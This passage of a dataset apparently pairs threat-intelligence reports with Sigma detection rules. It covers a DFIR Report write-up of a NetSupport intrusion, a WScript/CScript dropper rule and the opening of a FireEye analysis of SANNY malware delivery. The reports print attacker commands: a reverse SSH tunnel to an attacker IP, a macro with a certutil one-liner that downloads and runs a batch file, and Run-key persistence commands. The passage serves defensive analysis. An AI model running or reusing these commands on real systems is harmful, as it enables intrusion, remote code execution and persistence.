| Belcloud LTD                     |\n```\n\nThe command used to establish the reverse SSH tunnel within the scheduled task is described below:\n\n```image\nAlt: SSH Command\nDescription: The image depicts a detailed breakdown of a Reverse SSH Command used in cybersecurity. It shows various options and arguments associated with the command, such as invoking SSH, specifying the identity file for authentication, preventing remote command execution, binding ports, and connection settings. Each part of the command is visually connected with explanations, making it clear how each component functions and its significance in establishing a reverse SSH tunnel.\nTranscription: |\n  Reverse SSH Command\n  -----------------------------------------\n  %programdata%\\sshd\\ssh.exe          ── Invoke SSH\n  -i %programdata%\\sshd\\config\\keys\\id_rsa ── Private key used to authenticate to the remote server\n  -N                                   ── Prevents remote commands from executing since the command will only forward traffic.\n  -R 369:127.0.0.1:2222               ── Bind to port 369 on the remote system, and listen locally on port 2222 for traffic originating from 369.\n  root@185.206.146.129                ── Connect to 185.206.146.129 using root, and bind to port 396.\n  -o StrictHostKeyChecking=no          ── Prevent a interactive message from indicating the remote servers host key is unknown.\n  -o ServerAliveInterval=60            ── Number of seconds before the client will send a NULL packet to the server to keep the connection active.\n  -o ServerAliveCountMax=15            ── Number of keep alive packets that can be sent by the client before a response is received.\n```\n\nBelow diagram depicts this SSH reverse tunnel from the victim network to attacker’s VPS.\n\n```image\nAlt: SSH Tunnel\nDescription: The image illustrates the configuration of an SSH reverse tunnel from a victim network to an attacker's Virtual Private Server (VPS). It shows the threat actor's IP address (185.206.146.129) and highlights the communication path via TCP port 22 for the VPS and TCP port 2222 for the victim's beachhead. The diagram effectively conveys the concept of SSH tunneling in the context of a cyber intrusion.\nTranscription: |\n  Internet\n  \n  VPS\n  Threat Actor\n  185.206.146.129\n  \n  Reverse SSH Tunnel\n  TCP 22 → TCP 2222\n  \n  Victim Network\n  Beachhead\n```\n\n## Exfiltration\n\nDuring the intrusion, we noticed that the threat actors staging data of interest.  It is likely that the threat actor exfiltrated the data over the encrypted C2 channel; however, we observed no evidence of this activity.  The _ntds.dit_ can be used to dump hashes from the Active Directory, which can then be cracked using a tool like Hashcat. The file _mf.txt_ contained all dumped events with event id 4624. This could be analyzed offline to determine possible interesting accounts without actively querying the Active Directory. No specific exfiltration actions were observed, so anything taken was likely moved over existing command and control channels. The threat actor also appeared to be interested in some documents, but we only observed opening of those files, not any exfiltration attempts.\n\n## Impact\n\nThe threat actors were evicted from the network before any further impact occurred.\n\n## Timeline\n\n```image\nAlt: Timeline\nDescription: The image is a detailed timeline chart documenting a cybersecurity incident involving a Netsupport intrusion. It outlines specific events over multiple days, including timestamps of actions such as initial execution, persistence, command and control, discovery actions, lateral movement, and credential access on a domain controller. Each entry provides context about the activities performed, including commands executed and outcomes associated with the intrusion. The layout organizes the information chronologically, making it easy to follow the progression of the incident.\nTranscription: |\n  Netsupport Intrusion Results in Domain Compromise\n  \n  Day 1\n  03:34 UTC Initial Execution\n  - WScript.exe (C:\\Users\\Public\\Documents\\7329.js)\n  \n  03:34 UTC Persistence, Execution, and Command Control\n  - 23236: Downloads Netsupport Deployment Script\n  - Netsupport executed on hardcoded host\n  - Execution initiated via User Run key\n  - C2: 69.185.45.215\n  \n  03:49 UTC Discovery via Netsupport on Beachhead\n  - 185.204.145.251 2541 2554 2560 2603 2605\n  - Confidence:\n    - Version\n    - User\n    - Host group: \"Domain Admins\" /domain\n    - System info\n  \n  09:28 UTC Discovery\n  - net group \"Domain Admins\" /domain\n  \n  19:47 UTC Defense Evasion\n  - Initial settings changed to remote server\n  - Allow rules for WMI and DCOM\n  \n  Day 5\n  03:49 UTC Discovery\n  \n  Day 6\n  08:30 UTC Persistence and Command Control\n  - C:\\path\\to\\script.bat\n  - C:\\path\\to\\config.json: 15 min on port 2222\n  - Schedule task to execute on user logon\n  \n  10:55 UTC Discovery and Lateral Movement via atexec.py\n  - net group \"Enterprise Admins\" /domain\n  \n  20:15 UTC Lateral Movement\n  - Verifies by activity across various remote hosts\n  \n  Day 7\n  00:22 UTC Lateral Movement and Discovery\n  - Research of group membership 15 min prior\n  - 185.204.145.251 2541 2554 2560 2603 2605\n  - C2: 69.185.45.215\n  \n  22:25 UTC Credential Access on Domain Controller\n  - 185.204.145.251 2044 2394 2396 2405\n  - C:\\programdata\\microsoft\\windows\\start menu\\programs\\\n  \n  01:29 UTC Credential Access Domain Controller\n  - C:\\programdata\\microsoft\\windows\\start menu\\programs\\\n  \n  01:45 UTC Lateral Movement\n  - RDP login from beachhead host to domain controller\n  \n  02:56 UTC Defense Evasion on Domain Controller\n  - powershell: Add-PSSessionConfiguration -Name public\n  - powershell: Add-PSSessionConfiguration -Name custom\n  \n  Day 8\n  01:05 UTC Discovery from Domain Controller\n  - 185.204.145.251 2044 2394 2396 2405\n  - C:\\Users\\Public\\Documents\\script.bat\n  \n  01:43 UTC Persistence Established on Backup Server\n  - net user WEB\\BackupUser /active:yes /add\n  - net localgroup Administrators WEB\\BackupUser /add\n  \n  01:56 UTC Discovery from Backup Server\n  - C:\\Users\\Public\\Documents\\script.bat\n  \n  03:05 UTC Credential Access\n  - LSASecrets dumped on serverless host using Procdump\n  - Find /T /s\n  \n  16:52 UTC Persistence\n  - (script response to create local admin)\n  - C:\\Users\\Public\\Documents\\script.bat\n```\n\n## Indicators\n\n### Atomic\n\n```\n1otal[.]com\n79.137.202.132\n185.206.146.129\nnpinmclaugh11[.]com\nnpinmclaugh14[.]com\n89.185.85.44\nwsus-isv-local[.]tech\n79.137.206.37\nwsus-isv-internal[.]tech\n```\n\n### Computed\n\n```\n2326.js\n72dc8b8b6c7c083128728b8405fa5a8f\n9060c11e7d18d7047ad81aa4241187eebd93c0da\nb1f52abc28427c5a42a70db9a77163dde648348e715f59e8a335c7252ae4a032\n\nNSM.LIC\ne9609072de9c29dc1963be208948ba44\n03bbe27d0d1ba651ff43363587d3d6d2e170060f\ndc6a52ad6d637eb407cc060e98dfeedcca1167e7f62688fb1c18580dd1d05747\n\nNSM.ini\n88b1dab8f4fd1ae879685995c90bd902\n3d23fb4036dc17fa4bee27e3e2a56ff49beed59d\n60fe386112ad51f40a1ee9e1b15eca802ced174d7055341c491dee06780b3f92 \n\nPingCastle.exe\necb98b7b4d4427eb8221381154ff4cb2  PingCastle.exe\n72dbb719b05f89d9d2dbdf186714caf7639daa36\n768021fc242054decc280675750dec0a9e74e764b8646864c58756fa2386d2a2\n\nclient32.ini\n729711d44606095a4727aed7ff4d864d\n8af9952f5e0fa84606f588c5704c5a5ab7e06822\nbba34ad7183d7911f7f2c53bfe912d315d0e44d7aa0572963dc003d063130e85\n\nclient32u.ini\n7ba6ead2477bd9956886086f69552ac6\n3a8c2155f9b97e06f3d9990387492ef0260f6209\naa92645428fb4c4e2cccbdf9b6acd7e6a51eecc2d6d63d7b8fe2e119e93c2bb5\n\ninstall.bat\nb0f3b2741a50a3608f5c7f898d14c571\n3021194d590f5dfb32fb24c7d0e359c4db2f9178\n041b0504742449c7c23750490b73bc71e5c726ad7878d05a73439bd29c7d1d19\n\nmswow86.exe\nc60ac6a6e6e582ab0ecb1fdbd607705b\nba9de479beb82fd97bbdfbc04ef22e08224724ba\n4d24b359176389301c14a92607b5c26b8490c41e7e3a2abbc87510d1376f4a87\n\nnetscan32.exe\nd1212fb5c6333c218f62f3f83341539c\n19be503233f0eda426a418addc82edecf223af9d\n097f2a0e032bf20757e004e80c9a2640f41b8514e32d42004632de7c721b015f\n\nnetscan64.exe\nb30025427a546c23b122eea43171ef21\nf85c2447003221f59c9f0fa6654464ac78015be3\n5ef9844903e8d596ac03cc000b69bbbe45249eea02d9678b38c07f49e4c1ec46\n\nnskbfltr.inf\n26e28c01461f7e65c402bdf09923d435\n1d9b5cfcc30436112a7e31d5e4624f52e845c573\nd96856cd944a9f1587907cacef974c0248b7f4210f1689c1e6bcac5fed289368\n\nnsm_vpro.ini\n3be27483fdcdbf9ebae93234785235e3\n360b61fe19cdc1afb2b34d8c25d8b88a4c843a82\n4bfa4c00414660ba44bddde5216a7f28aeccaa9e2d42df4bbff66db57c60522b\n\nntds.bat\nab828b585b4c2ce90171e5e0b13aaa55\n5454d444aeefda5fb251b081218082ec858b94d3\n060e9ff09cd97ec6a1b614dcc1de50f4d669154f59d78df36e2c4972c2535714\n\nremcmdstub.exe\n6fca49b85aa38ee016e39e14b9f9d6d9\nb0d689c70e91d5600ccc2a4e533ff89bf4ca388b\nfedd609a16c717db9bea3072bed41e79b564c4bc97f959208bfa52fb3c9fa814\n\nstart.bat\n2736d3a1aa9cba6fa61db380d4bdf447\n2848dc0e665eb1b2508b75b4375c6937ab9a4968\n4c0736c9a19c2e172bb504556f7006fa547093b79a0a7e170e6412f98137e7cd\nB\n\npth_addadmin.exe\n4b0f482757876a3e07b94d2390d9906c\n141cd13c6fe9cf00d513b8e4cbc9b94b3ca9f4b3\n3bee705c062227dcb2d109bf62ab043c68ba3fb53b1ce679dc138273ba884b08\n\npth_createuser.exe\na02d89b0210671b3519c5d3818188e53\nad58d012e2bacc87f348e72e1377cf35bc6c9ebd\ne42620721f5ec455a63cded483d18dfa5abdabca3319b0a4e3e21bd098348d48\n```\n\n## Detections\n\n### Network\n\n```\nET INFO NetSupport Remote Admin Checkin\nET INFO NetSupport Remote Admin Response\nET MALWARE NetSupport RAT with System Information\nET POLICY NetSupport GeoLocation Lookup Request\nET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement\nET POLICY WinRM wsman Access - Possible Lateral Movement\nET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection\nET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection\n```\n\n### Sigma\n\nSearch sigma rules at detection.fyi\n\nSigma Repo:\n\n```\n0afbd410-de03-4078-8491-f132303cb67d - Renamed NetSupport RAT Execution\n2afafd61-6aae-4df4-baed-139fa1f4c345 - Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\n8bc64091-6875-4881-aaf9-7bd25b5dda08 - Suspicious Process Patterns NTDS.DIT Exfil\n0b8baa3f-575c-46ee-8715-d6f28cc7d33c - NTDS.DIT Created\n9f107a84-532c-41af-b005-8d12a607639f - Suspicious Cabinet File Expansion\n058f4380-962d-40a5-afce-50207d36d7e2 - HackTool - CrackMapExec Execution Patterns\n0ef56343-059e-4cb6-adc1-4c3c967c5e46 - Suspicious Execution of Systeminfo\n4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67 - Renamed ProcDump Execution\n17769c90-230e-488b-a463-e05c08e9d48f - Powershell Defender Exclusion\n1ec65a5f-9473-4f12-97da-622044d6df21 - Powershell Defender Disable Scan Feature\nad720b90-25ad-43ff-9b5e-5c841facc8e5 - Add User to Local Administrators Group\nffa28e60-bdb1-46e0-9f82-05f7a61cc06e - Suspicious Add User to Remote Desktop Users Group\n1e33157c-53b1-41ad-bbcc-780b80b58288 - WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript\ncd5cfd80-aa5f-44c0-9c20-108c4ae12e3c - New Firewall Rule Added Via Netsh.EXE\nca2092a1-c273-4878-9b4b-0d60115bf5ea - Suspicious Encoded PowerShell Command Line\n07f8bdc2-c9b3-472a-9817-5a670b872f53 - Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE\nb1ec66c6-f4d1-4b5c-96dd-af28ccae7727 - New Generic Credentials Added Via Cmdkey.EXE\n502b42de-4306-40b4-9596-6f590c81f073 - Local Accounts Discovery\n```\n\nJoe Security:\n\n```\n200105 - Powershell drops NetSupport RAT client\n```\n\nThe DFIR Report Repo:\n\n```\na5661068-c85f-4ee1-bc13-6b753bd2c7b7 - Adding, Listing and Removing Credentials via Cmdkey CommandLine Ultility\nd938de18-7f57-4c9c-93b9-a621c746d594 - NIM Pass The Hash Tooling Detection\n```\n\n### Yara\n\nYara Rules\n\n## Diamond Model\n\n```image\nAlt: Diamond Model\nDescription: The image depicts the Diamond Model of Intrusion Analysis, illustrating the relationship between the adversary, infrastructure, victim, and capabilities/TTPs (Tactics, Techniques, and Procedures). Each section includes specific details such as types of workstations, servers, and malware techniques used by the adversary. The diamond shape visually represents the interconnected factors involved in a cyber threat scenario, providing a structured view of the elements at play in an attack.\nTranscription: |\n  Adversary\n    ├── Workstations\n    │     ├── WIN-5ODCFIGQR3\n    │     ├── DESKTOP-TBD06K1\n    │     └── SSH-2.0-OpenSSH_8.4pl Debian-5+deb11u1\n    └── SSH Server\n          └── Public Key: bc:bc:d3:e0:a4:cc:fc:e1:dc:28:3a:6a:dc:51:93:ef\n  \n  Infrastructure\n    ├── lotal.com (79.137.202.132) ── NetSupport Deployment Script\n    ├── 185.206.146.129:22 ── SSH Server\n    ├── npinmclaugh11.com\n    ├── npinmclaugh14.com 89.185.85.44:2145\n    ├── wsus-isv-local.tech 79.137.206.37:133\n    └── wsus-isv-internal.tech\n  \n  Victim\n    ├── Workstation\n    ├── Domain Controllers\n    │     └── ndts dump\n    └── Various Servers\n  \n  Capabilities/TTPs\n    ├── Zipped Javascript Malware Delivered via Email\n    ├── Scheduled Task Persistence\n    ├── Reverse SSH Tunnel\n    ├── Impacket Usage (WmiExec.py and AtExec.py)\n    ├── Netscan and PingCastle\n    ├── NetSupport RAT\n    ├── ProcDump LSASS\n    ├── Dump NTDS.dit\n    └── Cab packaged payloads during lateral movement\n    └── 7-zip used during data collection\n```\n\n## MITRE\n\n```image\nAlt: MITRE\nDescription: The image is a structured table summarizing various tactics and techniques associated with a cyber incident labeled '19438 - Netsupport Intrusion Results in Domain Compromise'. It is organized into categories such as Initial Access, Execution, Persistence, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, and Command and Control. Each category lists specific tools used in the intrusion along with their corresponding MITRE ATT&CK techniques identified by unique codes (e.g., T1566.001 for Phishing). The table provides a clear overview of the tactics employed during the cyber attack, facilitating understanding of the intrusion methods.\nTranscription: |\n  19438 - Netsupport Intrusion Results in Domain Compromise\n  \n  | Tools               | Technique                                       |\n  | ------------------- | ----------------------------------------------- |\n  | Initial Access      | Phishing: Spearphishing Attachment - T1566.001  |\n  | Execution           | NetSupport - T1204.002                          |\n  |                     | Malicious File - T1204.002                      |\n  |                     | JavaScript - T1059.007                          |\n  |                     | PowerShell - T1059.001                          |\n  |                     | Windows Command Shell - T1059.003               |\n  |                     | Windows Management Instrumentation - T1047      |\n  | Persistence         | NetSupport                                      |\n  |                     | Registry Run Keys / Startup Folder - T1547.001  |\n  |                     | Scheduled Task - T1053.005                      |\n  |                     | Local Account - T1136.001                       |\n  | Defense Evasion     | Expand                                          |\n  |                     | Disable or Modify Tools - T1562.001             |\n  |                     | Obfuscated Files or Information - T1027         |\n  |                     | Deobfuscate/Decode Files or Information - T1140 |\n  |                     | Masquerade Task or Service - T1036.004          |\n  | Credential Access   | Ntdsutil                                        |\n  |                     | NTDS - T1003.003                                |\n  |                     | LSASS Memory - T1003.001                        |\n  | Discovery           | SoftPerfect Netscan                             |\n  |                     | PingCastle                                      |\n  |                     | net                                             |\n  |                     | ping                                            |\n  |                     | systeminfo                                      |\n  |                     | ntest                                           |\n  |                     | cmd                                             |\n  |                     | tasklist                                        |\n  |                     | whoami                                          |\n  |                     | cmkey                                           |\n  | Lateral Movement    | Impacted                                        |\n  |                     | wmiexec.py                                      |\n  |                     | atexec.py                                       |\n  | Collection          | 7-zip                                           |\n  |                     | Archive via Utility - T1560.001                 |\n  | Command and Control | NetSupport                                      |\n  |                     | Protocol Tunneling - T1572                      |\n  |                     | Proxy - T1090                                   |\n  |                     | Uncommonly Used Port - T1065                    |\n```\n\n```\nProxy - T1090\nUncommonly Used Port - T1065\nJavaScript - T1059.007\nWindows Command Shell - T1059.003\nPowerShell - T1059.001\nRegistry Run Keys / Startup Folder - T1547.001\nScheduled Task - T1053.005\nLocal Account - T1136.001\nDisable or Modify Tools - T1562.001\nNTDS - T1003.003\nLSASS Memory - T1003.001\nProtocol Tunneling - T1572\nWindows Management Instrumentation - T1047\nRemote Desktop Protocol - T1021.001\nSystem Owner/User Discovery - T1033\nDomain Groups - T1069.002\nRemote System Discovery - T1018\nSystem Information Discovery - T1082\nProcess Discovery - T1057\nDomain Account - T1087.002\nLocal Account - T1087.001\nArchive via Utility - T1560.001\nObfuscated Files or Information - T1027\nDeobfuscate/Decode Files or Information - T1140\nMasquerade Task or Service - T1036.004\nSMB/Windows Admin Shares - T1021.002\nLateral Tool Transfer - T1570\nMalicious File - T1204.002\nDomain Trust Discovery - T1482\nGroup Policy Discovery - T1615\n```",
    "sigma_rule": {
      "title": "Potential Dropper Script Execution Via WScript/CScript",
      "id": "cea72823-df4d-4567-950c-0b579eaf0846",
      "related": [
        {
          "id": "1e33157c-53b1-41ad-bbcc-780b80b58288",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects wscript/cscript executions of scripts located in user directories",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://redcanary.com/blog/gootloader/"
      ],
      "author": "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.005",
        "attack.t1059.007"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_exec": {
          "Image|endswith": [
            "\\wscript.exe",
            "\\cscript.exe"
          ]
        },
        "selection_paths": {
          "CommandLine|contains": [
            ":\\Temp\\",
            ":\\Tmp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\Temp\\",
            "\\AppData\\Local\\Temp\\"
          ]
        },
        "selection_ext": {
          "CommandLine|contains": [
            ".js",
            ".jse",
            ".vba",
            ".vbe",
            ".vbs",
            ".wsf"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Some installers might generate a similar behavior. An initial baseline is required"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wscript_cscript_dropper.yml",
    "id": "686"
  },
  {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab > nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > 